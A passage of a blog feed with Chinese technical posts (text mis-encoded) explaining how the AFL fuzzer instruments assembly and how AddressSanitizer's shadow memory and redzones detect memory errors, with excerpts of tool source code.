class="hljs-comment">/* Parameters passed to the real CC  */</span><br><span class="hljs-type">static</span> u32  cc_par_cnt = <span class="hljs-number">1</span>;         <span class="hljs-comment">/* Param count, including argv0      */</span><br><span class="hljs-type">static</span> u8   be_quiet,               <span class="hljs-comment">/* Quiet mode                        */</span><br>            clang_mode;             <span class="hljs-comment">/* Invoked as afl-clang*?            */</span><br></code></pre></td></tr></table></figure><h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><p>mainå‡½æ•°çš„æ ¸å¿ƒä¸»ä½“å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br>  ......<br>      <br>  find_as(argv[<span class="hljs-number">0</span>]);<br>    <br>  edit_params(argc, argv);<br><br>  execvp(cc_params[<span class="hljs-number">0</span>], (<span class="hljs-type">char</span>**)cc_params);<br><br>  ......<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>find_as</code>: try to find our â€œfakeâ€ GNU assembler in AFL_PATH or at the location derived from argv[0]. If that fails, abort.</li><li><code>edit_params</code>: Copy argv to <strong>cc_params</strong>, making the necessary edits.</li><li><code>execvp</code>: æ‰§è¡Œå‘½ä»¤</li></ul><h3 id="edit-params"><a href="#edit-params" class="headerlink" title="edit_params"></a>edit_params</h3><p>åœ¨<code>edit_params</code>ä¸­ï¼Œå…³é”®é€»è¾‘å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">...<br>    <br> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(name, <span class="hljs-string">&quot;afl-g++&quot;</span>)) &#123;<br>  u8* alt_cxx = getenv(<span class="hljs-string">&quot;AFL_CXX&quot;</span>);<br>  cc_params[<span class="hljs-number">0</span>] = alt_cxx ? alt_cxx : (u8*)<span class="hljs-string">&quot;g++&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(name, <span class="hljs-string">&quot;afl-gcj&quot;</span>)) &#123;<br>  u8* alt_cc = getenv(<span class="hljs-string">&quot;AFL_GCJ&quot;</span>);<br>  cc_params[<span class="hljs-number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="hljs-string">&quot;gcj&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  u8* alt_cc = getenv(<span class="hljs-string">&quot;AFL_CC&quot;</span>);<br>  cc_params[<span class="hljs-number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="hljs-string">&quot;gcc&quot;</span>;<br>&#125;<br><br>...<br>    <br>cc_params[cc_par_cnt++] = <span class="hljs-string">&quot;-B&quot;</span>;<br>cc_params[cc_par_cnt++] = as_path;<br><br>...<br></code></pre></td></tr></table></figure><p>æ€»ä½“é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œå®é™…å°±æ˜¯å¯¹å‚æ•°åšä¸€äº›é¢„å¤„ç†ï¼Œä¼šç”¨<code>gcc</code>æ›¿æ¢<code>cc_params[0]</code>ï¼Œåˆ©ç”¨<code>-B as_path</code>æ›¿æ¢æ±‡ç¼–å™¨ã€‚å› è€Œåœ¨è°ƒç”¨<code>execvp</code>æ‰§è¡Œå‘½ä»¤æ—¶ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯æ‰§è¡Œç±»ä¼¼<code>gcc ... -B as_path ...</code>è¿™æ ·çš„æ•ˆæœã€‚</p><h2 id="afl-as-c"><a href="#afl-as-c" class="headerlink" title="afl-as.c"></a>afl-as.c</h2><p>åœ¨ç†è§£<code>afl-gcc.c</code>ä¹‹åï¼Œæˆ‘ä»¬å°±è‡ªç„¶è€Œç„¶ä¼šæƒ³åˆ°ï¼Œæ ¸å¿ƒç‚¹åœ¨äºå…³æ³¨<code>afl-as</code>å’Œé»˜è®¤asçš„åŒºåˆ«ã€‚ç±»ä¼¼äºafl-gccï¼Œafl-asä¹Ÿæ˜¯ä¸€ä¸ªå¯¹asçš„å°è£…</p><p>ä¸€äº›å…¨å±€é™æ€å˜é‡ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> u8** as_params;          <span class="hljs-comment">/* Parameters passed to the real &#x27;as&#x27;   */</span><br><br><span class="hljs-type">static</span> u8*  input_file;         <span class="hljs-comment">/* Originally specified input file      */</span><br><span class="hljs-type">static</span> u8*  modified_file;      <span class="hljs-comment">/* Instrumented file for the real &#x27;as&#x27;  */</span><br><br><span class="hljs-type">static</span> u8   be_quiet,           <span class="hljs-comment">/* Quiet mode (no stderr output)        */</span><br>            clang_mode,         <span class="hljs-comment">/* Running in clang mode?               */</span><br>            pass_thru,          <span class="hljs-comment">/* Just pass data through?              */</span><br>            just_version,       <span class="hljs-comment">/* Just show version?                   */</span><br>            sanitizer;          <span class="hljs-comment">/* Using ASAN / MSAN                    */</span><br><br><span class="hljs-type">static</span> u32  inst_ratio = <span class="hljs-number">100</span>,   <span class="hljs-comment">/* Instrumentation probability (%)      */</span><br>            as_par_cnt = <span class="hljs-number">1</span>;     <span class="hljs-comment">/* Number of params to &#x27;as&#x27;             */</span><br></code></pre></td></tr></table></figure><h3 id="main-1"><a href="#main-1" class="headerlink" title="main"></a>main</h3><p><code>main()</code>å‡½æ•°çš„æ ¸å¿ƒä¸»ä½“å¦‚ä¸‹ï¼Œä¸afl-gcc.cä¸­çš„<code>main</code>ååˆ†ç±»ä¼¼ã€‚æ¯”è¾ƒæ˜æ˜¾ï¼Œéƒ½æ˜¯é€šè¿‡å…ˆå¯¹å‚æ•°è¿›è¡Œå¤„ç†ï¼Œç„¶åè°ƒç”¨<code>execvp()</code>å»æ‰§è¡Œå‘½ä»¤ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br>  ...<br>  gettimeofday(&amp;tv, &amp;tz);<br><br>  rand_seed = tv.tv_sec ^ tv.tv_usec ^ getpid();<br><br>  srandom(rand_seed);<br><br>  edit_params(argc, argv);<br>  ...  <br><br>  <span class="hljs-keyword">if</span> (!just_version) add_instrumentation();<br><br>  <span class="hljs-keyword">if</span> (!(pid = fork())) &#123;<br><br>    execvp(as_params[<span class="hljs-number">0</span>], (<span class="hljs-type">char</span>**)as_params);<br>    FATAL(<span class="hljs-string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, as_params[<span class="hljs-number">0</span>]);<br><br>  &#125;<br>  ...<br><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>ç¬¬ä¸€éƒ¨åˆ†ï¼Œæ¯”è¾ƒæ˜æ˜¾ï¼Œåˆ©ç”¨æ—¶é—´å’Œpidå³ç”Ÿæˆéšæœºæ•°</li><li><code>edit_params()</code>ç¼–è¾‘å‚æ•°</li><li><code>add_instrumentation()</code>æ’æ¡©</li><li>æœ€ååˆ©ç”¨execvpè°ƒç”¨æŒ‡ä»¤</li></ul><h3 id="edit-params-1"><a href="#edit-params-1" class="headerlink" title="edit_params"></a>edit_params</h3><p>ä¸afl-gccçš„é€»è¾‘åŸºæœ¬ä¸€è‡´ï¼Œæ›¿æ¢å‚æ•°ï¼Œä¸è¿‡å¤šèµ˜è¿°ï¼Œæ ¸å¿ƒéƒ¨åˆ†å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">edit_params</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br>    ...<br>    <br>    as_params[<span class="hljs-number">0</span>] = afl_as ? afl_as : (u8*)<span class="hljs-string">&quot;as&quot;</span>;<br>    ...<br>    <br>    as_params[as_par_cnt++] = modified_file;<br>    <br>    as_params[as_par_cnt]   = <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="add-instrumentation"><a href="#add-instrumentation" class="headerlink" title="add_instrumentation"></a>add_instrumentation</h3><p>æ¯”è¾ƒæ˜æ˜¾çš„çœ‹åˆ°å…¶ä»–éƒ¨åˆ†ä¸afl-gccåŸºæœ¬ç›¸åŒï¼Œå› è€Œæˆ‘ä»¬å…³é”®æ¥çœ‹çœ‹<code>add_instrumentation()</code>å‡½æ•°è¿™éƒ¨åˆ†å†…å®¹ã€‚è¿™ä¸ªå‡½æ•°ä¸»è¦ç”¨äºå¤„ç†è¾“å…¥çš„æ–‡ä»¶ï¼Œç„¶åç”Ÿæˆ<strong>modified_file</strong>.å¹¶åœ¨æ°å½“çš„åœ°æ–¹æ’æ¡©ã€‚æ­¤å‡½æ•°çš„æ ¸å¿ƒéƒ¨åˆ†å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">add_instrumentation</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    ...<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        åŒ¹é…åˆé€‚çš„æ’æ¡©ä½ç½®</span><br><span class="hljs-comment">        */</span><br>    ...<br>     <span class="hljs-keyword">while</span> (fgets(line, MAX_LINE, inf)) &#123;<br>     ...<br>            <br>        <span class="hljs-built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,<br>                R(MAP_SIZE));<br><br>    ins_lines++;<br>         <br>         ...<br>         <br>         <span class="hljs-keyword">continue</span>;<br>     &#125;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>ä»æºä»£ç çš„æ³¨é‡Šä¸­æˆ‘ä»¬ä¹Ÿèƒ½çœ‹åˆ°ï¼ŒAFLæ’æ¡©çš„ä½ç½®åå¥½ï¼Œä¸»è¦ä¸º<strong>å‡½æ•°å…¥å£ï¼Œåˆ†æ”¯æ ‡ç­¾ï¼Œæ¡ä»¶åˆ†æ”¯æ ‡ç­¾â€¦â€¦.</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* If we&#x27;re in the right mood for instrumenting, check for function</span><br><span class="hljs-comment">   names or conditional labels. This is a bit messy, but in essence,</span><br><span class="hljs-comment">   we want to catch:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     ^main:      - function entry point (always instrumented)</span><br><span class="hljs-comment">     ^.L0:       - GCC branch label</span><br><span class="hljs-comment">     ^.LBB0_0:   - clang branch label (but only in clang mode)</span><br><span class="hljs-comment">     ^\tjnz foo  - conditional branches</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   ...but not:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     ^# BB#0:    - clang comments</span><br><span class="hljs-comment">     ^ # BB#0:   - ditto</span><br><span class="hljs-comment">     ^.Ltmp0:    - clang non-branch labels</span><br><span class="hljs-comment">     ^.LC0       - GCC non-branch labels</span><br><span class="hljs-comment">     ^.LBB0_0:   - ditto (when in GCC mode)</span><br><span class="hljs-comment">     ^\tjmp foo  - non-conditional jumps</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   Additionally, clang and GCC on MacOS X follow a different convention</span><br><span class="hljs-comment">   with no leading dots on labels, hence the weird maze of #ifdefs</span><br><span class="hljs-comment">   later on.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><p>åœ¨<code>add_instrumentation()</code>å‡½æ•°ä¸­çš„å˜é‡<code>trampoline_fmt_64</code>å’Œ<code>trampoline_fmt_32</code>å³ä¸ºæ’æ¡©ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ–‡ä»¶<strong>afl-as.h</strong>ä¸­æ‰¾åˆ°å®šä¹‰ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥çœ‹çœ‹64ä½çš„æ’æ¡©ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">/* --- AFL TRAMPOLINE (64-BIT) --- */<br><br>.align 4<br><br>leaq -(128+24)(%%rsp), %%rsp<br>movq %%rdx,  0(%%rsp)<br>movq %%rcx,  8(%%rsp)<br>movq %%rax, 16(%%rsp)<br>movq $0x%08x, %%rcx<br>call __afl_maybe_log<br>movq 16(%%rsp), %%rax<br>movq  8(%%rsp), %%rcx<br>movq  0(%%rsp), %%rdx<br>leaq (128+24)(%%rsp), %%rsp<br><br>/* --- END --- */<br></code></pre></td></tr></table></figure><p>æµç¨‹éå¸¸ç®€å•æ˜“æ‡‚ï¼Œå¤§è‡´å¦‚ä¸‹ï¼š</p><ol><li>å…¥æ ˆä¿å­˜å¯„å­˜å™¨</li><li><code>call __afl_maybe_log</code></li><li>å‡ºæ ˆæ¢å¤å¯„å­˜å™¨</li></ol><p>è¿™é‡Œç›´æ¥æ¥çœ‹çœ‹<code>__afl_maybe_log</code>å‡½æ•°ï¼Œç”±äºè¿™æ®µæ±‡ç¼–é€»è¾‘è¿‡é•¿ï¼Œå¤§æ¦‚200å¤šè¡Œã€‚è¿™é‡Œç›´æ¥æ”¾<strong>ScUpax0så¸ˆå‚…</strong>çš„æµç¨‹å›¾</p><p><img src="/img/article/fuzzAFL1/image-20230830151452876.png" alt="image-20230830151452876"></p><p>æµç¨‹å›¾ä¸­æ¶‰åŠåˆ°çš„ä¸€äº›å˜é‡åŠå«ä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.lcomm   __afl_area_ptr, 8/*å…±äº«å†…å­˜åœ°å€*/<br>.lcomm   __afl_prev_loc, 8/*ä¸Šä¸€ä¸ªæ’æ¡©ä½ç½®ï¼ˆidä¸ºR(100)éšæœºæ•°çš„å€¼ï¼‰*/<br>.lcomm   __afl_fork_pid, 4/*ç”±forkäº§ç”Ÿçš„å­è¿›ç¨‹çš„pid*/<br>.lcomm   __afl_temp, 4/*ç¼“å†²åŒº*/<br>.lcomm   __afl_setup_failure, 1/*æ ‡å¿—ä½ï¼Œå¦‚æœç½®ä½åˆ™ç›´æ¥é€€å‡º*/<br>.comm    __afl_global_area_ptr, 8, 8/*å…¨å±€æŒ‡é’ˆ*/<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€fuzzã€‘ASANåŸç†è§£æ</title>
    <link href="/2023/08/29/ASAN%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/"/>
    <url>/2023/08/29/ASAN%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><blockquote><p>å‚è€ƒæ–‡ç« ï¼š</p><ul><li><a href="https://zhuanlan.zhihu.com/p/382994002">å·¥æ¬²å–„å…¶äº‹å¿…å…ˆåˆ©å…¶å™¨â€”â€”AddressSanitizer - çŸ¥ä¹ (zhihu.com)</a></li><li><a href="https://github.com/google/sanitizers/wiki/AddressSanitizer">google&#x2F;sanitizers(github.com)</a></li></ul></blockquote><p>æœ¬æ‰€æ¶‰åŠåˆ°çš„ç›¸å…³ä»£ç å¯ä»¥åœ¨æˆ‘çš„ä»“åº“å†…æ‰¾åˆ°ï¼š<a href="https://github.com/Loora1N/how2ASAN/blob/main/README.md">how2ASAN&#x2F;README.md at main Â· Loora1N&#x2F;how2ASAN (github.com)</a></p><h2 id="ASANç®€ä»‹"><a href="#ASANç®€ä»‹" class="headerlink" title="ASANç®€ä»‹"></a>ASANç®€ä»‹</h2><p>ASANï¼ˆAddress Sanitizerï¼‰æ˜¯é’ˆå¯¹ C&#x2F;C++ çš„å¿«é€Ÿå†…å­˜é”™è¯¯æ£€æµ‹å·¥å…·ï¼Œåœ¨è¿è¡Œæ—¶æ£€æµ‹ C&#x2F;C++ ä»£ç ä¸­çš„å¤šç§å†…å­˜é”™è¯¯ã€‚ASAN æ—©å…ˆæ˜¯ LLVM ä¸­çš„ç‰¹æ€§ï¼Œåè¢«é›†æˆåˆ° GCC 4.8 ä¸­ï¼Œåœ¨ 4.9 ç‰ˆæœ¬ä¸­åŠ å…¥äº†å¯¹ ARM å¹³å°çš„æ”¯æŒã€‚</p><p>ASAN ç›®å‰æ”¯æŒçš„å¹³å°æœ‰ X86&#x2F;X86_64&#x2F;ARM&#x2F;ARM64ï¼Œå¯¹äº ARM64 å¹³å°ï¼ŒAndroid å®˜æ–¹æ¨èä½¿ç”¨ HWASan ï¼ˆHWAddress Sanitizerï¼‰ã€‚ç›®å‰æ”¯æŒä¸€ä¸‹ç±»å‹çš„å†…å­˜é”™è¯¯ï¼š</p><ul><li>use-after-free</li><li>use-after-return</li><li>use-after-scope</li><li>heap-buffer-overflow</li><li>stack-buffer-overflow</li><li>global-buffer-overflow</li><li>Memory leaks</li><li>double-free</li><li>Initialization order bugs</li></ul><p>å¯ä»¥é€šè¿‡ç¼–è¯‘æ—¶ï¼Œä½¿ç”¨<code>clang</code>å’Œ<code>-fsanitize=address</code>å‚æ•°å¼€å¯æ­¤åŠŸèƒ½</p><h2 id="ASANåŸç†"><a href="#ASANåŸç†" class="headerlink" title="ASANåŸç†"></a>ASANåŸç†</h2><p>ASANæ¨¡å—ä¸»è¦åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼š</p><ul><li>instrument é™æ€æ’æ¡©æ¨¡å—ï¼Œå¯¹æ ˆä¸Šå¯¹è±¡ã€å…¨å±€å¯¹è±¡ã€åŠ¨æ€åˆ†é…çš„å¯¹è±¡åˆ†é… redzoneï¼Œä»¥åŠé’ˆå¯¹è¿™äº›å†…å­˜åšè®¿é—®æ£€æµ‹</li><li>runtime è¿è¡Œæ—¶åº“ï¼Œæ›¿æ¢ <code>malloc</code>ï¼Œ<code>free</code>ï¼Œ<code>memcpy</code>ï¼Œ<code>memset</code>ç­‰å®ç°ã€æä¾›æŠ¥é”™å‡½æ•°</li></ul><h3 id="æ’æ¡©"><a href="#æ’æ¡©" class="headerlink" title="æ’æ¡©"></a>æ’æ¡©</h3><p>ASANä¼šåœ¨æ¶‰åŠå†…å­˜è¯»å†™çš„åœ°æ–¹è¿›è¡Œæ’æ¡©ï¼Œæ¯”å¦‚å¦‚ä¸‹ä»£ç ï¼ˆæ’æ¡©å‰ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">*addr = ...;<br></code></pre></td></tr></table></figure><p>æ’æ¡©åï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (IsPoisoned(addr)) &#123;<br>  ReportError(addr, kAccessSize, kIsWrite);<br>&#125;<br>*addr = ...; <span class="hljs-comment">// or ... = *addr;</span><br></code></pre></td></tr></table></figure><p>å³é€šè¿‡<code>IsPoisoned()</code>å‡½æ•°æ¥ç¡®å®šåœ°å€æ˜¯å¦åˆæ³•ï¼Œè€Œè¿™ä¸ªå‡½æ•°çš„å®ç°ä¾èµ–äº<strong>shadow memory</strong>æŠ€æœ¯ã€‚</p><h3 id="shadow-memory"><a href="#shadow-memory" class="headerlink" title="shadow memory"></a>shadow memory</h3><p>åœ¨ASANä¸­ï¼Œä¼šå°†8å­—èŠ‚å†…å­˜æ˜ å°„1å­—èŠ‚å†…å­˜çš„æ–¹å¼åˆ›å»º<strong>shadow memory</strong>ã€‚ç”¨shadow memoryä¸­æ¯ä¸ªå­—èŠ‚çš„å€¼æ¥ä»£è¡¨å®é™…å†…å­˜ä¸­ï¼Œæ‰€å¯¹åº”çš„8ä¸ªå­—èŠ‚çš„çŠ¶æ€ã€‚shadow memoryä¹Ÿä¼šåˆ©ç”¨memmapæ˜ å°„åˆ°è¿›ç¨‹çš„è™šæ‹Ÿå†…å­˜ä¸­ï¼Œå®é™…æ¢ç®—å…³ç³»å¦‚ä¸‹:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">shadow_addr = (real_addr &gt; <span class="hljs-number">3</span>) + offset; <br></code></pre></td></tr></table></figure><ul><li>real_addrä¸ºå®é™…è®¿é—®åœ°å€ï¼Œå¦‚å †æ ˆåœ°å€</li><li>shadow_addr æŒ‡æ˜ å°„çš„shadow memoryçš„å­˜å‚¨åœ°å€</li><li>offsetä¸ºä¸€ä¸ªåç§»ï¼Œæ˜¯ä¸ºäº†é˜²æ­¢shadow memoryä¸ç”¨æˆ·æ­£å¸¸ä½¿ç”¨çš„åœ°å€å‡ºç°é‡å </li></ul><p>å…·ä½“å®ç°å¯ä»¥çœ‹è¿™é‡Œ<a href="https://github.com/llvm/llvm-project/blob/60c0256ef1875e62e91b7c1126f001a586225466/llvm/lib/Transforms/Instrumentation/AddressSanitizer.cpp#L459">AddressSanitizer.cpp (github.com)</a>çš„<code>getShadowMapping()</code>å‡½æ•°ã€‚</p><p>shadow memoryçš„å–å€¼å¤§è‡´å¯ä»¥åˆ†ä¸ºä»¥ä¸‹3ç§æƒ…å†µï¼š</p><ul><li>0x00ï¼Œä»£è¡¨è¯¥8å­—èŠ‚å¯æ­£å¸¸è¯»å†™</li><li>å°äº8çš„æ­£æ•´æ•°nï¼Œä»£è¡¨è¯¥8ä¸ªå­—èŠ‚ä¸­åªæœ‰å‰nä¸ªå­—èŠ‚å¯è¯»å†™</li><li>è´Ÿæ•°ï¼Œä»£è¡¨è¯¥åŒºåŸŸä¸å¯è¯»å†™ã€‚</li></ul><p>å…·ä½“ä¸åŒçš„æ•°å€¼æœ‰ä¸åŒçš„å«ä¹‰ï¼Œå¯ä»¥å‚è€ƒä¸‹å›¾æŸ¥çœ‹ï¼Œå†æ¯æ¬¡ASANæŠ¥é”™æ—¶ä¹Ÿä¼šè¾“å‡ºæ­¤å›¾çš„å†…å®¹</p><p><img src="/img/article/asan/image-20230829165130934-1693299735767-3.png" alt="shadow memoryå–å€¼"></p><h3 id="redzone-amp-posion"><a href="#redzone-amp-posion" class="headerlink" title="redzone &amp; posion"></a>redzone &amp; posion</h3><p>åœ¨ä¸Šä¸€èŠ‚çš„å›¾ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¾ˆå¤šè´Ÿæ•°å€¼å¯¹åº”ç€<strong>redzone</strong>ï¼Œä¹Ÿå°±æ˜¯ä¸å¯è¯»å†™çš„åŒºåŸŸã€‚ASANå°†ä¸€äº›åŒºåŸŸæ ‡è®°ä¸º<strong>redzone</strong>å’Œ<strong>posion</strong>çŠ¶æ€ï¼Œåœ¨è¯»å†™æ“ä½œå‰åˆ©ç”¨<code>IsPosioned(addr)</code>å‡½æ•°ï¼Œæ£€æŸ¥addræ‰€å¯¹åº”çš„<strong>shadow memory</strong>æ˜¯å¦ä¸ºredzoneï¼Œä»¥æ­¤è¾¾åˆ°æº¢å‡ºæ£€æµ‹çš„æ•ˆæœã€‚</p><h4 id="æ ˆç©ºé—´"><a href="#æ ˆç©ºé—´" class="headerlink" title="æ ˆç©ºé—´"></a>æ ˆç©ºé—´</h4><p>æ¯åˆ›å»ºä¸€ä¸ªæ–°çš„æ ˆå¸§ï¼ŒASANéƒ½ä¼šä¸ºæ ˆé¢å¤–åˆ†é…ä¸€äº›redzoneç©ºé—´ï¼Œåˆ†å¸ƒåœ¨æ ˆé¡¶ï¼Œå±€éƒ¨å˜é‡ä¹‹é—´ï¼Œä»¥åŠæ ˆåº•ã€‚å‡è®¾æœ‰å¦‚ä¸‹ä¸»å‡½æ•°:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> a[<span class="hljs-number">13</span>];<br>    <span class="hljs-type">char</span> b[<span class="hljs-number">13</span>];<br><br>    a[<span class="hljs-number">-1</span>] = <span class="hljs-number">0</span>;<br>    b[<span class="hljs-number">13</span>] = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆå®é™…çš„æ ˆå†…å­˜å’Œshadow memoryä¸‹å›¾æ‰€ç¤ºï¼Œæ ˆç©ºé—´redzoneåˆ›å»ºä¼šä»¥32byteå¯¹é½:</p><p><img src="/img/article/asan/v2-2a937f952b8eab88609d9cba28c90959_720w.webp" alt="img"></p><blockquote><p>è¿™å›¾ç›´æ¥å·çš„çŸ¥ä¹å¤§ä½¬ï¼Œæ°´å°ä¹Ÿç•™ç€ï¼Œåœ¨æœ¬æ–‡å¼€å¤´æœ‰åŸæ–‡é“¾æ¥ï¼Œä¾µåˆ </p></blockquote><p>å› ä¸ºè€ƒè™‘åˆ°æ ˆå¸§æ˜¯å­˜åœ¨é‡å¤åˆ©ç”¨çš„æƒ…å†µï¼Œå› è€Œåœ¨å‡½æ•°returnä¹‹å‰ï¼Œä¼šå°†è¯¥æ ˆå¸§çš„å…¨éƒ¨shadow memoryæ¸…é›¶ï¼Œé˜²æ­¢å› ä¸ºå­˜ç•™çš„redzoneæ ‡è®°è€Œå½±å“åˆ°å…¶ä»–å‡½æ•°çš„è°ƒç”¨ã€‚</p><h4 id="å †ç©ºé—´"><a href="#å †ç©ºé—´" class="headerlink" title="å †ç©ºé—´"></a>å †ç©ºé—´</h4><p>ASANä¸ºäº†èƒ½å¤Ÿæ£€æµ‹å †åŒºåŸŸçš„çš„æº¢å‡ºã€UAFç­‰é—®é¢˜ï¼Œä¹Ÿä½¿ç”¨redzoneè¿›è¡Œæ 